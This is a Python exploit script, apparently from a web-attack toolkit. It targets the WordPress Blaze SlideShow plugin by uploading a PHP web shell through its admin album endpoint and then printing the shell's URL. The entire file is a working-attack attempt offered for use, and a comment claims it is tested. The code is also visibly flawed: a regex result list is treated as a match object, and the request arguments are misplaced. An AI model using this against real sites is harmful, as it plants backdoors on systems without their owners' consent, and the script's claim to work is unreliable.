import requests
import re

#tested True =  exploit work

def wp_blaze(target):
    headers = {'User-Agent':'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0',
                'Content_Type':'multipart/form-data'
            }
    payload = {
               'album_img':[open('../shells/Orusula.php','rb')],
               'task':'blaze_add_new_album',
               'album_name':'',
               'album_desc':''
        }
    endpoint = target + "/wp-admin/admin.php?page=blaze_manage"
    content = requests.post(endpoint,payload,headers).text
    check_blaze = re.findall(r"\/uploads\/blaze\/(.*?)\/big\/Orusula.php", content)
    if check_blaze:
        uploadfolder = check_blaze.group(1)
        dump_data = target + "/wp-content/uploads/blaze/"+uploadfolder+"/big/Orusula.php"
        print ('[+] Blaze SlideShow {}'.format(dump_data))
    else:
        print ('[-] Blaze SlideShow')